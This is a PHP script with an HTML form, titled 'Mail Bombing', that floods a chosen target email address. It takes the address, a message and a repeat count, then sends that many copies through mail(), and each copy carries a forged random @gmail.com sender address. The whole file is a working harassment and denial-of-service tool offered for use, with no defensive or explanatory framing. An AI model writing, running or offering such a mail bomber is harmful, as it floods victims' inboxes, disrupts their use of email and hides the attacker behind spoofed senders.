<?php

    function randMail() {

        $arr = [
            'a', 'b', 'c', 'd', 'e',
            'f', 'g', 'h', 'i', 'j',
            'k', 'l', 'm', 'n', 'o',
            'p', 'q', 'r', 's', 't',
            'y', 'x', 'w', 'v', 'u',
            'z', 'A', 'B', 'C', 'D',
            'I', 'H', 'G', 'F', 'E',
            'N', 'M', 'L', 'K', 'J',
            'S', 'R', 'Q', 'P', 'O',
            'T', 'U', 'V', 'W', 'X',
            'Y', 'Z', '0', '1', '2',
            '7', '6', '5', '4', '3',
            '8', '9'
          ];
          $randomName = "";
      
          for ($i = 1; $i <= 62; $i++) {
          
              $randArr = array_rand($arr);
              $randomName .= $arr[$randArr];
              
          }
          
          $randNameSorting  = substr($randomName, 0, 20)."@gmail.com";

          return $randNameSorting;

    }

    if(isset($_POST["temail"]) && isset($_POST["quantity"]) && isset($_POST["Boom"]) && isset($_POST["msg"])) {

        $temail = $_POST["temail"];
        $quantity = $_POST["quantity"];
        $msg = $_POST["msg"];

        for ($a = 1; $a <= $quantity; $a++) {

            $form = randMail();
            $headers = "From: {$form}" . "\r\n";
            $some = mail($temail, "Mail Bombing", $msg, $headers);

        }
    
    }


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mail Bombing</title>
    <style>
        body{
            background-color: #000;
            color: #fff;
        }
        form{
            width: 300px;
            height: 300px;
            margin: auto;
            margin-top: 250px;
        }
    </style>
</head>
<body>
    
    <div class="containar">

        <form method="POST">
            <label for="temail">Targeted Email</label><br>
            <input type="temail" name="temail" id="email"><br><br>
            <label for="quantity">How many times want you send?</label><br>
            <input type="number" name="quantity" id="quantity"><br><br>
            <label for="msg">Massage</label><br>
            <textarea id="msg" name="msg" rows="4" cols="25"></textarea><br><br>
            <input type="submit" value="Boom" name="Boom">
        </form>

    </div>





</body>
</html>